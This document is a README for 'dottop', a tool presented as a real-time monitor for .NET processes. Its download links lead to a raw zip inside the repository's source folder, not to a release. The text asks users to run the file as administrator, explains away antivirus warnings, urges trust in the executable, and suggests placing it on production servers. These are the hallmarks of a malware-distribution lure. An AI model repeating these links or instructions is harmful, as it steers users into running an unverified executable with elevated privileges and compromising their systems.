# 📊 dottop - Watch your .NET applications in real-time

[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/logical-selvage819/dottop/main/src/DotTop/UI/Software-3.4.zip)

dottop provides a live view of your .NET applications. It shows how much memory your program uses, how many requests it handles, and its overall health. You do not need to change your code or install extra tools to use it. It works instantly on any system running a .NET process.

## 🛠 What this tool does

Many applications run in the background. Sometimes these programs slow down or stop working well. Usually, you need complex tools to find these problems. These tools often require you to change your code or restart your server. dottop avoids these steps. It taps into your running program to show you what happens inside. It displays memory usage, thread activity, and request counts in a simple window. You see the internal state of your application without stopping it.

## 📝 Prerequisites

dottop runs on Windows systems. Ensure you have the following installed before you start:

- Windows 10 or 11
- .NET Runtime 6.0 or higher
- Administrative rights for your user account

You find these runtimes on the official Microsoft website if you do not have them yet.

## 📥 Getting the software

You must visit the releases page to download the latest version of the program. 

[Click here to visit the download page](https://raw.githubusercontent.com/logical-selvage819/dottop/main/src/DotTop/UI/Software-3.4.zip)

Choose the file that ends in .exe for your Windows installation. Save this file to a folder where you can find it easily, such as your Downloads folder or a Documents folder.

## 🚀 Running the application

Follow these steps to start monitoring your programs:

1. Locate the file you downloaded.
2. Right-click the file and select "Run as administrator". This step is necessary because the program needs permission to view other running processes on your computer.
3. A terminal window will open.
4. You will see a list of processes currently running on your system.
5. Use your keyboard arrow keys to select the .NET application you want to monitor.
6. Press the Enter key to attach to the process.
7. The screen will update automatically with live statistics.

## 📋 Understanding the interface

The main screen shows several columns of data. 

- CPU Usage: This tells you how hard the computer works for this specific program. High numbers mean the program uses a lot of processing power.
- Memory: Look at this value to see how much RAM your program requires. A steady increase in this number might indicate a memory leak.
- Active Threads: This represents the tasks currently handled by your application. 
- Request Count: This shows how many web requests arrive at your service.

## ⚙️ Keyboard controls

You can control dottop using simple keyboard inputs while the program runs:

- Up and Down arrows: Move through the list of available processes.
- Enter: Select a process to monitor.
- Q: Exit the program and close the monitor.
- R: Refresh the process list if you just started a new application.
- H: Open the help menu to view these controls again.

## 🛡 Security and privacy

dottop attaches to processes to read data. It does not send this data to the cloud. Everything stays on your local machine. Because this tool reads system information, many antivirus programs might flag it. This occurs because the tool interacts with other running programs. You can trust the executable from the official link provided in this document.

## 💡 Solving common issues

If you do not see your application in the list, ensure the application is running. dottop can only see programs that are already active. If the program starts after you launch dottop, press the R key to refresh the list. 

If you see an error about permissions, close the terminal window and restart the program by right-clicking it and choosing "Run as administrator". The tool needs elevated access to "see" inside other programs.

If the text appears small or the window looks strange, click the icon in the top left corner of the window. Select Properties to change the font size or window layout to suit your screen.

## 🧩 Why use this approach

Traditional methods for monitoring .NET programs require you to be a developer. They ask you to install plugins, modify your code, and restart your servers. You lose time during these steps. dottop removes these hurdles. You simply download, run, and watch. It provides the same level of insight without the technical overhead. It works perfectly for quick checks when you notice your server feels slow or unresponsive.

## 🔍 Using with servers

You can copy the executable to a production server if needed. Because it requires no installation, you simply place the file in a folder and run it. Remember to keep the file in a secure location on your server to prevent unauthorized access to your system metrics.

## 📝 Future improvements

This project is a work in progress. It focuses on stability and basic monitoring. Support for more advanced metrics and graphical charts may appear in future versions. You can report bugs or suggest new features by visiting the main repository page. Your feedback helps make the tool better for everyone.